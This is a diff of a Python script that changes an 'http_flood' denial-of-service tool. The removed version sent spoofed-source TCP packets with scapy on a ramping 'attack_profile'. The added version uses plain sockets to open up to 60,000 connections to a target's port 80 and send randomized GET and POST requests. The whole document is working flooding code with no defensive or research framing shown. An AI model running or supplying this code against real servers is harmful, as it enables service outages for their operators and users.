@@ -1,11 +1,13 @@
 #!/usr/bin/env python3
-import scapy.all as scapy
+import socket
 import random
 import time
 import sys
 import string
 
-paths = ["/", "/login", "/api/data", "/products", "/search", "/images/banner.jpg"]
+
+paths = ["/", "/login", "/api", "/data", "/products"]
+
 
 def random_string(n=6):
     return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))
@@ -14,56 +16,51 @@ def random_string(n=6):
 def build_http_payload():
     method = random.choice(["GET", "POST"])
     path = random.choice(paths) + "?id=" + random_string()
+
     headers = [
-        f"Host: example.com",
+        "Host: example.com",
         f"User-Agent: Bot/{random.randint(1,10)}",
-        f"Connection: {random.choice(['keep-alive','close'])}"
+        "Connection: close"
     ]
+
     body = ""
     if method == "POST":
         body = "data=" + random_string(20)
         headers.append(f"Content-Length: {len(body)}")
 
-    payload = f"{method} {path} HTTP/1.1\r\n" + \
-              "\r\n".join(headers) + "\r\n\r\n" + body
-
-    return payload
-
-
-def attack_profile(duration):
-    start = time.time()
-    while True:
-        elapsed = time.time() - start
-        if elapsed > duration:
-            break
-        phase = elapsed / duration
-        yield 0.4 + (0.8 * phase)
+    return f"{method} {path} HTTP/1.1\r\n" + \
+           "\r\n".join(headers) + "\r\n\r\n" + body
 
 
 def http_flood(target_ip, duration):
 
-    base_rate = 20
-    peak_rate = 500
+    target_flows = 60000
+    flows_created = 0
+    start = time.time()
 
-    for intensity in attack_profile(duration):
+    while flows_created < target_flows and (time.time() - start) < duration:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
 
-        current_rate = base_rate + (peak_rate - base_rate) * intensity
+            # Kernel chooses source IP + port automatically
+            s.connect((target_ip, 80))
 
-        pkt = (
-            scapy.IP(src=f"192.168.{random.randint(1,50)}.{random.randint(1,254)}", dst=target_ip) /
-            scapy.TCP(
-                sport=random.randint(1024, 65535),
-                dport=80,
-                flags="PA"
-            ) /
-            build_http_payload()
-        )
+            payload = build_http_payload().encode()
+            s.sendall(payload)
 
-        scapy.send(pkt, verbose=0)
+            try:
+                s.recv(1024)
+            except:
+                pass
 
-        sleep_time = max(0.001, 1.0 / current_rate)
-        sleep_time *= random.uniform(0.7, 1.3)
-        time.sleep(sleep_time)
+            s.close()
+            flows_created += 1
+
+        except:
+            pass
+
+    print(f"Approx HTTP flows generated: {flows_created}")
 
 
 if __name__ == "__main__":
